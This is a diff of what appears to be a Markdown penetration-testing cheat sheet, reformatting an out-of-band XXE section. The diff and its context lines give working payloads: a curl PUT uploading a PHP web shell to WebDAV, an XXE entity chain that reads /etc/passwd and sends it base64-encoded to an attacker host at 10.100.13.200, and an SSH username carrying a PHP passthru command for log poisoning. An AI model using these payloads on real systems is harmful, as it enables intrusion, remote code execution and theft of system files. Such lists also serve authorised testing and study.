@@ -329,14 +329,12 @@ xmlns:urn=\"urn:muddy\"><soapenv:Header/>
 > 1. Webdav password location probably ```bash var/www/html/webdav/passwd.dav```
 > 1. Uploading PHP rce on WebDav via CURL ```curl -X PUT -u administrantor:password http://abc.com/webdav/myrce.php --data-binary @"/usr/share/webshells/php/codeexec.php"``` 
 	
-#### XXE Remote
-> 1. Add following in BurpSuite `<!DOCTYPE reset [
-<!ENTITY % remote SYSTEM "http://10.100.13.200:12345/malicious3.xml">
-%remote;
-%thisss;
-%whattt; ]>`
-> 2. malicious3.xml `<!ENTITY % hacked SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
-<!ENTITY % thisss "<!ENTITY &#x25; whattt SYSTEM 'http://10.100.13.200:12345/?%hacked;'>"> `
+#### XXE Injection Remote
+> 1. Add following in BurpSuite 
+> 1. `<!DOCTYPE reset [ <!ENTITY % remote SYSTEM "http://10.100.13.200:12345/malicious3.xml"> %remote; %thisss; %whattt; ]>`
+> 1. Add follwoing malicious3.xml in Kali box 
+> 1. `<!ENTITY % hacked SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">`
+> 1. `<!ENTITY % thisss "<!ENTITY &#x25; whattt SYSTEM 'http://10.100.13.200:12345/?%hacked;'>">`
 
 #### Log poision via SSH auth.log
 > 1. ssh '<?php passthru($_GET['cmd']);?>'@192.168.10.106
